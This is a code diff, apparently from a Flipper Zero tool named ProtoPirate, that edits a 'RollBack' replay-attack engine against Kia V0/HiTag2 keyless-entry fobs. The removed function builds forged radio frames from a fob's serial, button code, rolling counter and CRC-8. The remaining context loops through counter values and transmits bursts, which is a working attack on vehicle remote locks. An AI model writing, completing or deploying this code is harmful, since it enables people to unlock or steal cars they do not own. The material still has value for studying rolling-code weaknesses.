@@ -2,39 +2,11 @@
 
 // ===================== RollBack 攻击引擎 =====================
 // 基于已知序列号+按钮，枚举计数器进行重放攻击
-
-void rollback_build_frame(
-    uint32_t serial,
-    uint8_t button,
-    uint16_t counter,
-    uint32_t* data_hi,
-    uint32_t* data_lo) {
-
-    // Kia V0/HiTag2 frame construction:
-    // [28-bit serial << 12] | [4-bit button << 8] | [16-bit counter] | [CRC-8]
-    uint32_t frame_serial = (serial & 0x0FFFFFFF) << 12;
-    uint16_t frame_btn = (button & 0x0F) << 8;
-    uint16_t frame_cnt = counter;
-
-    uint32_t prelim_lo = frame_serial | frame_btn | frame_cnt;
-
-    // Calculate CRC over 6 bytes (3 from hi, 3 from lo)
-    uint8_t crc_bytes[6] = {0};
-    crc_bytes[0] = 0;
-    crc_bytes[1] = 0;
-    crc_bytes[2] = 0;
-    crc_bytes[3] = (prelim_lo >> 24) & 0xFF;
-    crc_bytes[4] = (prelim_lo >> 16) & 0xFF;
-    crc_bytes[5] = (prelim_lo >> 8) & 0xFF;
-    uint8_t crc = kia_crc8(crc_bytes, 6);
-
-    *data_hi = 0;
-    *data_lo = frame_serial | frame_btn | frame_cnt | crc;
-
-    FURI_LOG_I(
-        TAG, "RollBack frame: serial=0x%07lX btn=0x%X cnt=0x%04X crc=0x%02X -> 0x%08lX%08lX",
-        serial, button, counter, crc, *data_hi, *data_lo);
-}
+//
+// 注意: rollback_build_frame 已在 protopirate_rb.c 中定义
+// 这里只保留 rollback_attack_run (旧版阻塞式，向后兼容)
+//
+// 新版使用 protopirate_rb.c 中的非阻塞 scene_rollback_alloc
 
 bool rollback_send_single(
     ProtoPirateApp* app,
@@ -76,6 +48,7 @@ bool rollback_attack_run(ProtoPirateApp* app) {
     for(uint16_t cnt = start;; cnt += direction * step) {
         uint32_t data_hi, data_lo;
         rollback_build_frame(rs->serial, rs->button, cnt, &data_hi, &data_lo);
+
 
         transmit_burst(app, data_hi, data_lo);
         furi_delay_ms(30);
